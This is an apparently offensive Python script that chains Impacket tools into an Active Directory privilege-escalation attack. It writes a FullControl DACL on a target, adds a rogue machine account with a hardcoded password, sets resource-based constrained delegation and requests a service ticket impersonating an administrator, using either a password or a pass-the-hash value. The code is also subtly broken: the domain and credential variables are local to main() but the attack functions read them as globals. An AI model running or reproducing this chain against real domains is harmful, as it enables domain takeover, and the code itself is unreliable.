import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

def WriteDaclHash():
    tar = input(f"{CYAN}Target:{RED} ")
    net = input(f"{CYAN}NetBios Name (ex DC01): {RED}")
    imp = input(f"{CYAN}User to Impersonate (ex administrator): ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -principal {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    print(f"{YELLOW}Adding Computer OGC with password P@ssw0rd123!@#{RESET}")
    subprocess.call([f"addcomputer.py -method LDAPS -computer-name 'OGC$' -computer-pass 'P@ssw0rd123!@#' -dc-host {DOMAIN} -domain-netbios {net} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    print(f"{YELLOW}RBCD{RESET}")
    subprocess.call([f"rbcd.py -delegate-from 'OGC$' -delegate-to '{tar}' -action 'write' {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    print(f"{YELLOW}Getting Service Ticket{RESET}")
    subprocess.call([f"getST.py -spn 'cifs/{net}.{DOMAIN}' -impersonate {imp} '{DOMAIN}/OGC$:P@ssw0rd123!@#'"], shell=True)
    print(f"{YELLOW}Now you should be able to pass the ticket, you may need to run PyWhisker {RESET}")

def WriteDaclPass():
    tar = input(f"{CYAN}Target:{RED} ")
    net = input(f"{CYAN}NetBios Name (ex DC01): {RED}")
    imp = input(f"{CYAN}User to Impersonate (ex administrator): ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -principal {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)
    print(f"{YELLOW}Adding Computer OGC with password P@ssw0rd123!@#{RESET}")
    subprocess.call([f"addcomputer.py -method LDAPS -computer-name 'OGC$' -computer-pass 'P@ssw0rd123!@#' -dc-host {DOMAIN} -domain-netbios {net} {DOMAIN}/{USER}:{PASS}"], shell=True)
    print(f"{YELLOW}RBCD{RESET}")
    subprocess.call([f"rbcd.py -delegate-from 'OGC$' -delegate-to '{tar}' -action 'write' {DOMAIN}/{USER}:{PASS}"], shell=True)
    print(f"{YELLOW}Getting Service Ticket{RESET}")
    subprocess.call([f"getST.py -spn 'cifs/{net}.{DOMAIN}' -impersonate {imp} '{DOMAIN}/OGC$:P@ssw0rd123!@#'"], shell=True)
    print(f"{YELLOW}Now you should be able to pass the ticket, you may need to run PyWhisker {RESET}")

def main():
    # Get the arguments from the argument_parser.py
    args = parse_arguments()

    # Extract arguments
    DOMAIN = args.DomainName
    USER = args.Username
    PASS = args.Password
    HASH = args.PassTheHash  

    # Execute the appropriate function based on the parsed arguments
    if HASH:
        WriteDaclHash()  
    else:
        WriteDaclPass()  

if __name__ == '__main__':
    main()